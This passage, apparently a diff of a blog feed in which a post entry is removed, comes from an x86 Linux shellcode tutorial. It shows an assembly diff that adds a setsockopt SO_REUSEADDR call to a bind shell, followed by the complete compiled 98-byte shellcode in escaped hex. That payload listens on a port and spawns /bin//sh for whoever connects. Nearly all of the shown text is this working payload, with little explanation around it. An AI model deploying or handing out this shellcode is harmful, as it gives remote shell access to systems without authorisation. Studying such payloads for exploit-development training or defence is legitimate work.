-</code></pre>
-
-<p>Having the <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> call would result in an increase of <strong>16 bytes</strong>:</p>
-
-<pre><code class="diff">--- ../../0x01-bind/bind.asm.in 2018-05-21 00:35:48.689635600 +0100
-+++ setsockopt.asm      2018-05-21 00:41:40.340303200 +0100
-@@ -1,9 +1,12 @@
-+; Like the bind shell but with a call to setsockopt(2). Allows a server to bind
-+; to a port even if there are previously established connections. Also useful
-+; when there are multiple local aliased IP addresses listening on the same port.
-+
- global _start
-
- section .text
- _start:
-        xor eax, eax
--       xor esi, esi            ; will always hold the value 0
-        cdq                     ; set edx to zero as well, by sign extending eax
-
-        mov ax, 0x167           ; use mov instead of push imm16 and pop r16
-@@ -15,7 +18,18 @@
-        ; edx (protocol) initialized to zero by the cdq instruction above
-        int 0x80
-
-+       xchg edx, ebx           ; SO_REUSEADDR
-        xchg ebx, eax           ; fd on ebx from this point below
-+       mov ax, 0x16e           ; use mov instead of push imm16 and pop r16
-+       ; int setsockopt(int, int, int, const void *, socklen_t)
-+       ; ecx (level) is already 1 from the above socket(2) call
-+       push 0x1                ; enabled
-+       mov esi, esp            ; optval
-+       push 0x4                ; 4 bytes
-+       pop edi                 ; optlen
-+       int 0x80
-+
-+       xor esi, esi            ; will always hold the value 0
-        mov ax, 0x169           ; use mov instead of push imm16 and pop r16
-        ; int bind(int, const struct sockaddr *, socklen_t)
-        push esi                ; INADDR_ANY
-</code></pre>
-
-<pre><code class="bash">$ asm-compile setsockopt.asm
-$ asm-opcodes setsockopt
-Shellcode size: 98                      
-\x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x87\xd3\x93\x66\xb8\x6e\x01\x6a\x01\x89\xe6\x6a\x04\x5f\xcd\x80\x31\xf6\x66\xb8\x69\x01\x56\x66\x68\x10\x92\x
-66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x56\x68\x6e
-\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
 </code></pre>
 ]]></content>
   </entry>
